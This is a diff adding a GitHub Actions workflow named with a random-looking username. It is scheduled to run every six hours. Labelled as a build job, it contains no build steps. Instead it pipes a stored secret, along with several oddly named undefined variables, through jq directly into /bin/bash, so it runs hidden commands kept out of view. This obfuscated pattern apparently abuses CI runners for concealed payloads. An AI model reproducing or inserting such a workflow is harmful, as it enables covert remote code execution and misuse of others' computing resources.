@@ -1,0 +1,20 @@
+name: chenqinian3490
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenqinian3490
+        env:
+          f42: ${{ secrets.f42 }}
+        run: |
+          echo $f42 | jq -r .ogtex506 | /bin/bash
+          echo $be60160 | jq -r .n7 | /bin/bash
+          echo $grfv6 | jq -r .iahmh4923 | /bin/bash
+          echo $drk21 | jq -r .sullx45783 | /bin/bash
+          echo $maqey90564 | jq -r .ljokd33 | /bin/bash
+
